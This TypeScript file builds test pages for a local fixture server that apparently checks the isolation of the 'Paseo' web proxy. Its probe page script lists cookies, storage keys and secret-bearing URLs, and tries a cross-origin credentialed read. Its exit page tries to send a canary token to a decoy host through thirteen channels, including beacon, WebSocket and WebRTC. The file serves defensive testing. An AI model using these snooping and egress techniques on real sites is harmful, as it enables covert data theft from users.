/**
 * HTML documents the fixture serves. Every page carries the request nonce on `<html data-nonce>` and
 * as selectable text, so a DOM-rendering path can prove it has the document (read the nonce back)
 * while a frame-streaming path cannot. Pages only reference their own origin, the configured peer,
 * or the configured decoy; nothing points at the public internet.
 */

export interface PageContext {
  nonce: string;
  /** The fixture's own origin as the server knows it; pages compare it with `location.origin`. */
  origin: string;
}

export interface ProbePageContext extends PageContext {
  peer: string;
}

export interface ExitPageContext extends PageContext {
  decoy: string;
  token: string;
}

const LIGHT_TARGET_BYTES = 46 * 1024;

const VOCABULARY = [
  "fixture",
  "render",
  "local",
  "document",
  "selection",
  "zoom",
  "scroll",
  "textarea",
  "keyboard",
  "latency",
  "host",
  "relay",
  "origin",
  "cookie",
  "stream",
  "redirect",
  "policy",
  "nonce",
  "synthetic",
  "paragraph",
  "measure",
  "baseline",
  "android",
  "chromium",
  "brave",
  "daemon",
  "transport",
  "budget",
  "frame",
  "glyph",
];

export function escapeHtml(value: string): string {
  return value
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");
}

/** JSON for an inline `<script>`: `<` is escaped so a value can never close the script element. */
export function scriptValue(value: unknown): string {
  return JSON.stringify(value).replaceAll("<", "\\u003c");
}

function shell(context: PageContext, kind: string, title: string, body: string): string {
  return `<!doctype html>
<html lang="en" data-nonce="${escapeHtml(context.nonce)}" data-fixture="${escapeHtml(kind)}">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>${escapeHtml(title)}</title>
<style>
body{font:16px/1.5 system-ui,sans-serif;margin:0;padding:16px;max-width:720px}
code[data-role=nonce]{user-select:all;background:#eef;padding:2px 4px}
textarea{width:100%;min-height:96px}
#log li{font-family:monospace;font-size:13px}
</style>
</head>
<body>
<header>
<h1>${escapeHtml(title)}</h1>
<p>nonce <code data-role="nonce">${escapeHtml(context.nonce)}</code></p>
<p>served from <code data-role="served-origin">${escapeHtml(context.origin)}</code>, document origin <code data-role="document-origin"></code></p>
</header>
${body}
<script>
document.querySelector('[data-role=document-origin]').textContent = location.origin;
</script>
</body>
</html>
`;
}

/** Deterministic filler: the same seed always yields the same bytes, so page size is stable. */
function deterministicParagraphs(seed: number, targetBytes: number): string {
  let state = seed >>> 0;
  const next = () => {
    state = (Math.imul(state, 1664525) + 1013904223) >>> 0;
    return state;
  };
  const paragraphs: string[] = [];
  let bytes = 0;
  while (bytes < targetBytes) {
    const words: string[] = [];
    const length = 60 + (next() % 40);
    for (let index = 0; index < length; index += 1) {
      words.push(VOCABULARY[next() % VOCABULARY.length]);
    }
    const paragraph = `<p>${words.join(" ")}.</p>`;
    paragraphs.push(paragraph);
    bytes += paragraph.length + 1;
  }
  return paragraphs.join("\n");
}

export function lightPage(context: PageContext): string {
  const nonce = escapeHtml(context.nonce);
  const body = `<main>
<form method="get" action="/api/echo" data-role="form-get">
<input type="hidden" name="n" value="${nonce}">
<label>query <input name="q" value="unicode ação 日本語"></label>
<button type="submit">GET</button>
</form>
<form method="post" action="/api/echo?n=${encodeURIComponent(context.nonce)}" data-role="form-post">
<label>message <textarea name="message">type here</textarea></label>
<button type="submit">POST</button>
</form>
<article data-role="filler">
${deterministicParagraphs(42, LIGHT_TARGET_BYTES)}
</article>
</main>
<script>
document.documentElement.dataset.ready = "1";
</script>`;
  return shell(context, "light", "Paseo web proxy fixture: light", body);
}

export function spaPage(context: PageContext): string {
  const body = `<nav>
<a href="/spa/one" data-route>one</a> <a href="/spa/two" data-route>two</a> <a href="#fragment" data-route>fragment</a>
</nav>
<section id="view" data-route="/spa"></section>
<p>
<button type="button" id="fetch-relative">fetch relative</button>
<button type="button" id="fetch-absolute">fetch absolute</button>
<button type="button" id="abort-slow">abort slow</button>
</p>
<ol id="log"></ol>
<script>
(function () {
  var nonce = ${scriptValue(context.nonce)};
  var origin = ${scriptValue(context.origin)};
  var view = document.getElementById("view");
  var log = document.getElementById("log");
  function note(label, value) {
    var item = document.createElement("li");
    item.textContent = label + ": " + value;
    log.appendChild(item);
    document.documentElement.dataset.lastResult = label + ":" + value;
  }
  function render() {
    view.textContent = "route " + location.pathname + location.hash;
    view.dataset.route = location.pathname + location.hash;
  }
  document.querySelectorAll("a[data-route]").forEach(function (anchor) {
    anchor.addEventListener("click", function (event) {
      event.preventDefault();
      history.pushState({}, "", anchor.getAttribute("href"));
      render();
    });
  });
  window.addEventListener("popstate", render);
  window.addEventListener("hashchange", render);
  function echo(url, label) {
    fetch(url, { headers: { "x-fixture-nonce": nonce } })
      .then(function (response) { return response.json(); })
      .then(function (body) { note(label, body.method + " " + body.path); })
      .catch(function (error) { note(label, "error " + error.name); });
  }
  document.getElementById("fetch-relative").addEventListener("click", function () {
    echo("/api/echo?n=" + encodeURIComponent(nonce), "relative");
  });
  document.getElementById("fetch-absolute").addEventListener("click", function () {
    echo(origin + "/api/echo?n=" + encodeURIComponent(nonce), "absolute");
  });
  document.getElementById("abort-slow").addEventListener("click", function () {
    var controller = new AbortController();
    fetch("/slow?bytes=65536&chunk=1024&intervalMs=50&n=" + encodeURIComponent(nonce), { signal: controller.signal })
      .then(function (response) {
        var reader = response.body.getReader();
        return reader.read().then(function () { controller.abort(); return reader.read(); });
      })
      .then(function () { note("abort", "completed"); })
      .catch(function (error) { note("abort", error.name); });
  });
  render();
  document.documentElement.dataset.ready = "1";
})();
</script>`;
  return shell(context, "spa", "Paseo web proxy fixture: spa", body);
}

export function probePage(context: ProbePageContext): string {
  const body = `<p>Adversarial probe against <code data-role="peer">${escapeHtml(context.peer)}</code>. Results are posted to <code>/probe/report</code>.</p>
<pre id="result" data-role="result"></pre>
<script>
(function () {
  var nonce = ${scriptValue(context.nonce)};
  var peer = ${scriptValue(context.peer)};
  var report = { nonce: nonce, probes: {} };
  function attempt(name, run) {
    return Promise.resolve()
      .then(run)
      .then(function (value) { report.probes[name] = { ok: true, value: value }; })
      .catch(function (error) { report.probes[name] = { ok: false, error: String(error && error.name || error) }; });
  }
  var suspiciousGlobals = ["$scramjetController", "DaemonClient", "__PASEO__", "__paseo", "paseoClient"];
  Promise.all([
    attempt("documentCookieNames", function () {
      return document.cookie.split(";").map(function (pair) { return pair.split("=")[0].trim(); }).filter(Boolean);
    }),
    attempt("localStorageKeys", function () { return Object.keys(localStorage); }),
    attempt("cachesKeys", function () { return caches.keys(); }),
    attempt("indexedDbNames", function () {
      return indexedDB.databases().then(function (list) { return list.map(function (db) { return db.name; }); });
    }),
    attempt("serviceWorkerScopes", function () {
      return navigator.serviceWorker.getRegistrations().then(function (list) { return list.map(function (r) { return r.scope; }); });
    }),
    attempt("isTop", function () { return window.top === window; }),
    attempt("parentDocumentReadable", function () { return typeof window.parent.document.title === "string"; }),
    attempt("broadcastChannel", function () { var channel = new BroadcastChannel("paseo-fixture"); channel.close(); return true; }),
    attempt("performanceEntryUrlsWithSecrets", function () {
      return performance.getEntries().map(function (entry) { return entry.name; }).filter(function (name) { return /token|secret|key=/i.test(name); });
    }),
    attempt("globalsFound", function () {
      return suspiciousGlobals.filter(function (name) { return name in window; });
    }),
    attempt("peerCookieRead", function () {
      return fetch(peer + "/cookie/read?n=" + encodeURIComponent(nonce), { credentials: "include" })
        .then(function (response) { return response.json().then(function (body) { return { status: response.status, body: body }; }); });
    }),
  ]).then(function () {
    document.getElementById("result").textContent = JSON.stringify(report, null, 2);
    return fetch("/probe/report?n=" + encodeURIComponent(nonce), {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(report),
    });
  }).then(function () {
    document.documentElement.dataset.probeDone = "1";
  });
})();
</script>`;
  return shell(context, "probe", "Paseo web proxy fixture: probe", body);
}

export const EXIT_VECTORS = [
  "fetch",
  "xhr",
  "img",
  "stylesheet",
  "font",
  "beacon",
  "worker",
  "import",
  "iframe",
  "open",
  "websocket",
  "form",
  "rtc",
] as const;

export function exitPage(context: ExitPageContext): string {
  const body = `<p>Egress attempts toward <code data-role="decoy">${escapeHtml(context.decoy)}</code> with token <code data-role="token">${escapeHtml(context.token)}</code>.</p>
<ol id="log"></ol>
<iframe name="sink" title="sink" hidden></iframe>
<script>
(function () {
  var nonce = ${scriptValue(context.nonce)};
  var decoy = ${scriptValue(context.decoy)};
  var token = ${scriptValue(context.token)};
  var vectors = ${scriptValue(EXIT_VECTORS)};
  var fired = 0;
  function target(vector) {
    return decoy + "/canary/" + token + "?n=" + encodeURIComponent(nonce) + "&v=" + vector;
  }
  function note(vector, outcome) {
    fired += 1;
    var item = document.createElement("li");
    item.textContent = vector + ": " + outcome;
    document.getElementById("log").appendChild(item);
    document.documentElement.dataset.exitFired = String(fired);
  }
  function swallow(vector, promise) {
    Promise.resolve(promise).then(function () { note(vector, "attempted"); }, function (error) { note(vector, "error " + (error && error.name || error)); });
  }
  var runners = {
    fetch: function () { return fetch(target("fetch"), { mode: "no-cors" }); },
    xhr: function () { var request = new XMLHttpRequest(); request.open("GET", target("xhr")); request.send(); },
    img: function () { var image = new Image(); image.src = target("img"); },
    stylesheet: function () { var link = document.createElement("link"); link.rel = "stylesheet"; link.href = target("stylesheet"); document.head.appendChild(link); },
    font: function () {
      var style = document.createElement("style");
      style.textContent = "@font-face{font-family:FixtureExit;src:url(" + JSON.stringify(target("font")) + ")}";
      document.head.appendChild(style);
      var span = document.createElement("span"); span.style.fontFamily = "FixtureExit"; span.textContent = "font"; document.body.appendChild(span);
    },
    beacon: function () { navigator.sendBeacon(target("beacon"), "x"); },
    worker: function () { new Worker(target("worker")); },
    import: function () { return import(target("import")); },
    iframe: function () { var frame = document.createElement("iframe"); frame.src = target("iframe"); frame.hidden = true; document.body.appendChild(frame); },
    open: function () { window.open(target("open"), "sink"); },
    websocket: function () { new WebSocket(target("websocket").replace(/^http/, "ws")); },
    form: function () {
      var form = document.createElement("form"); form.method = "post"; form.action = target("form"); form.target = "sink";
      document.body.appendChild(form); form.submit();
    },
    rtc: function () {
      var url = new URL(decoy);
      var connection = new RTCPeerConnection({ iceServers: [{ urls: "stun:" + url.hostname + ":" + (url.port || 3478) }] });
      connection.createDataChannel("x");
      return connection.createOffer().then(function (offer) { return connection.setLocalDescription(offer); });
    },
  };
  vectors.forEach(function (vector) {
    try { swallow(vector, runners[vector]()); } catch (error) { note(vector, "throw " + (error && error.name || error)); }
  });
  document.documentElement.dataset.ready = "1";
})();
</script>`;
  return shell(context, "exit", "Paseo web proxy fixture: exit", body);
}
